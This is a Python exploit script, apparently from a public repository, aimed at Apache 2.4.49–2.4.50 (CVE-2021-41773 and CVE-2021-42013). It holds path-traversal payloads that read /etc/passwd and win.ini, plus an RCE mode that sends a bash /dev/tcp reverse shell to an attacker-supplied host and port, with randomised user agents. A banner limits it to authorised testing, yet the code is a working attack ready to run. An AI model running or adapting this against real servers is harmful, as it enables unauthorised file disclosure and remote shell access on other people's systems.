import argparse
import requests
import random
import sys
try:
    from fake_useragent import UserAgent
except ImportError:
    print("[!] ERROR: 'fake-useragent' library not found.")
    print("   Install it with: pip install fake-useragent")
    sys.exit(1)

def header():
    print('''
 ▗▄▖▗▄▄▖ ▗▄▖ ▗▄▄▗▖ ▗▗▄▄▄▖     ▗▄▄▖▗▄▄▖▗▄▖▗▖  ▗▗▖  ▗▗▄▄▄▗▄▄▖
▐▌ ▐▐▌ ▐▐▌ ▐▐▌  ▐▌ ▐▐▌       ▐▌  ▐▌  ▐▌ ▐▐▛▚▖▐▐▛▚▖▐▐▌  ▐▌ ▐▌
▐▛▀▜▐▛▀▘▐▛▀▜▐▌  ▐▛▀▜▐▛▀▀▘     ▝▀▚▐▌  ▐▛▀▜▐▌ ▝▜▐▌ ▝▜▐▛▀▀▐▛▀▚▖
▐▌ ▐▐▌  ▐▌ ▐▝▚▄▄▐▌ ▐▐▙▄▄▖    ▗▄▄▞▝▚▄▄▐▌ ▐▐▌  ▐▐▌  ▐▐▙▄▄▐▌ ▐▌
                        https://github.com/Yqno    (2021 vuln repro only)

[!] WARNING: This tool is for EDUCATIONAL / AUTHORIZED TESTING ONLY.
    It targets CVE-2021-41773 & CVE-2021-42013 (Apache 2.4.49–2.4.50 ONLY).
    Using it against unauthorized systems is ILLEGAL.
    Latest Apache (2.4.66 as of Feb 2026) is NOT vulnerable to these checks.
''')

def print_custom_help():
    print('''\
Usage: ApacheScanner.py [options]

Apache 2.4.49/2.4.50 vulnerability scanner (CVE-2021-41773 / CVE-2021-42013 repro).
For authorized labs, CTFs, education, or legacy system testing only.

Options:
  -h, --help            Show this help message and exit
  -u URL, --url URL     Target URL (e.g., example.com or http://192.168.1.100) [required]
  -t TIMEOUT, --timeout TIMEOUT
                        Request timeout in seconds (default: 25)
  -p PORT, --port PORT  Target port (default: 80)
  -c COMMAND, --command COMMAND
                        Command/file to test via traversal (default: whoami)
  --rce                 Enable reverse shell RCE attempt (requires --lhost/--lport)
  --cmd CMD             Custom command for RCE (default: whoami)
  --lhost LHOST         Attacker IP for reverse shell
  --lport LPORT         Attacker listening port for reverse shell
  --insecure            Disable SSL verification (useful for self-signed certs)
''')

class Exploiter:
    def __init__(self, url, timeout=25, port=80, command="whoami", rce=False,
                 cmd="whoami", lhost=None, lport=None, insecure=False):
        self.url = self.normalize_url(url)
        self.timeout = timeout
        self.port = port
        self.command = command
        self.rce = rce
        self.cmd = cmd
        self.lhost = lhost
        self.lport = lport
        self.verify = not insecure

        self.ua = UserAgent()
        try:
            self.ua.update()  # Try to refresh DB (may fail offline → uses cache)
        except:
            pass  # Fallback to cached data

        self.base_headers = {
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        }

        # 2021-era payloads (still valid only on vulnerable versions)
        self.path_traversal_payloads = [
            "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
            "/cgi-bin/.%2e/.%2e/.%2e/.%2e/windows/win.ini",
            "/../../../../../../etc/passwd",
            "/..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
            "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd",  # double-encode for 2.4.50
            "/..\\..\\..\\..\\..\\windows\\win.ini",
        ]

    def normalize_url(self, url):
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url  # Default to http for vulnerable lab setups
        return url.rstrip('/')

    def get_headers(self):
        return {**self.base_headers, 'User-Agent': self.ua.random}

    def check_apache(self):
        print(f"[*] Checking if {self.url} exposes Apache server...")
        try:
            r = requests.head(self.url, headers=self.get_headers(),
                              timeout=self.timeout, verify=self.verify)
            server = r.headers.get('Server', '').lower()
            if 'apache' in server:
                print(f"[+] Apache detected via Server header: {r.headers.get('Server')}")
                return True
            else:
                print("[-] No 'Apache' in Server header (may still be vulnerable if hidden).")
                return True  # Proceed anyway for hidden cases
        except Exception as e:
            print(f"[!] Connection error: {e}")
            return False

    def check_pathtraversal(self):
        print(f"[*] Testing path traversal payloads (CVE-2021-41773 style)...")
        for payload in self.path_traversal_payloads:
            target = f"{self.url}{payload}"
            try:
                r = requests.get(target, headers=self.get_headers(),
                                 timeout=self.timeout, verify=self.verify)
                if r.status_code == 200:
                    content = r.text.lower()
                    if any(x in content for x in ["root:x:", "bin:", "[extensions]", "for 16-bit"]):
                        print(f"[!!!] POTENTIAL PATH TRAVERSAL SUCCESS: {payload}")
                        print(f"     Status: {r.status_code} | Length: {len(r.text)}")
                        print(f"     Snippet: {r.text.strip()[:400]}...\n")
                    elif self.command.lower() in content:
                        print(f"[+] Command echo possible: {payload} → '{self.command}' found in response")
            except Exception as e:
                print(f"[!] Payload failed {payload}: {str(e)}")

    def check_rce(self):
        if not self.lhost or not self.lport:
            print("[!] --lhost and --lport required for --rce mode")
            return

        print(f"[*] Attempting RCE reverse shell to {self.lhost}:{self.lport} ...")
        target = f"{self.url}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
        rev_payload = f"bash -c 'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1'"

        try:
            data = {"echo": rev_payload}  # Classic naive PoC format
            r = requests.post(target, data=data, headers=self.get_headers(),
                              timeout=self.timeout + 10, verify=self.verify)
            if r.status_code in (200, 502, 500):
                print(f"[+] Possible RCE triggered (status {r.status_code}) — check your netcat listener!")
                print(f"    Tip: nc -lvnp {self.lport}")
            else:
                print(f"[-] RCE attempt returned status {r.status_code}")
        except Exception as e:
            print(f"[!] RCE attempt error: {e}")

    def run_checks(self):
        if not self.check_apache():
            print("[!] Target unreachable or not responding → exiting")
            return
        print("\n[*] Proceeding with 2021 vulnerability checks...")
        self.check_pathtraversal()
        if self.rce:
            self.check_rce()


def main():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument('-h', '--help', action='store_true')
    parser.add_argument('-u', '--url', type=str, required=True)
    parser.add_argument('-t', '--timeout', type=int, default=25)
    parser.add_argument('-p', '--port', type=int, default=80)
    parser.add_argument('-c', '--command', type=str, default='whoami')
    parser.add_argument('--rce', action='store_true')
    parser.add_argument('--cmd', type=str, default='whoami')
    parser.add_argument('--lhost', type=str)
    parser.add_argument('--lport', type=int)
    parser.add_argument('--insecure', action='store_true')

    args, unknown = parser.parse_known_args()

    if args.help or '-h' in sys.argv:
        header()
        print_custom_help()
        sys.exit(0)

    if args.rce and (not args.lhost or not args.lport):
        print("[!] --rce requires --lhost and --lport")
        sys.exit(1)

    header()

    exploiter = Exploiter(
        url=args.url,
        timeout=args.timeout,
        port=args.port,
        command=args.command,
        rce=args.rce,
        cmd=args.cmd,
        lhost=args.lhost,
        lport=args.lport,
        insecure=args.insecure
    )
    exploiter.run_checks()


if __name__ == "__main__":
    main()
